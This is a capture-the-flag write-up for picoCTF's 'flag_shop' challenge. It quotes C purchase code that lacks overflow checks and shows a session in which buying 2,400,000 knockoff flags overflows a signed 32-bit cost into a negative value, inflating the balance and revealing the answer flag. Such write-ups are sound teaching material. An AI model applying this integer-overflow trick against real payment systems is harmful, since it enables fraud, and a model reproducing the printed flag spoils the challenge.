# flag_shop
## Description
There's a flag shop selling stuff, can you buy a flag? [Source](store.c). Connect with `nc jupiter.challenges.picoctf.org 44566`.
## Hints
1. Two's compliment can do some weird things when numbers get really big!
## Solution
1. Look at the code for purchasing a knockoff flag (starting at line 37). It doesn't check max values.
```c
if(number_flags > 0){
    int total_cost = 0;
    total_cost = 900*number_flags;
    printf("\nThe final cost is: %d\n", total_cost);
    if(total_cost <= account_balance){
        account_balance = account_balance - total_cost;
        printf("\nYour current balance after transaction: %d\n\n", account_balance);
    }
    else{
        printf("Not enough funds to complete purchase\n");
    }
}
```
2. The largest positive number represented by a 32-bit signed integer is `2,147,483,647`. A knockoff flag costs `900`, which means if we buy a little more than `2.386M` of them we will force an overflow into negative values and end up adding money to our account.
```console
% jupiter.challenges.picoctf.org 44566
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2400000

The final cost is: -2134967296

Your current balance after transaction: 2134968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_68d16363}
```
